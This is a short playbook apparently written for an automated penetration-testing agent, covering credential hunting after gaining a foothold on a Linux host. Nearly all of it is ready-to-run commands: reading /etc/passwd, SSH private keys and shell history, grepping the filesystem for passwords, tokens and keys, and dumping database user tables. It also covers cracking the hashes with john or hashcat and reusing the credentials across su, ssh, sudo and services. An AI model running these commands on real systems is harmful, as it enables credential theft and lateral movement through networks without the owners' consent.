---
name: credential-hunting
when: you have any foothold and need creds to move up or across
tools: [session, shell]
phase: escalate
---
# Credential hunting

```
cat /etc/passwd; ls -la /home/*/                      # users, home dirs
grep -RinE 'pass(word)?|secret|token|api[_-]?key|BEGIN (RSA|OPENSSH) PRIVATE' \
  /var/www /opt /etc /home /srv 2>/dev/null | head -50
find / -name '*.bak' -o -name '*.conf' -o -name '.env' 2>/dev/null
cat ~/.bash_history ~/.ssh/id_* /root/.ssh/id_* 2>/dev/null
mysql -u root -p... -e 'select * from users'          # app DB user tables (hashes)
```
Crack hashes offline: identify with `hashid`, then
`john --wordlist=/usr/share/wordlists/rockyou.txt hashes` or `hashcat -m <mode> hashes rockyou.txt`.
Reuse everywhere: su to other users, ssh, sudo, service logins, DB. Config files (wp-config.php,
settings.py, .env, tomcat-users.xml) are the richest source. Record every credential with record_credential
and note where it works.
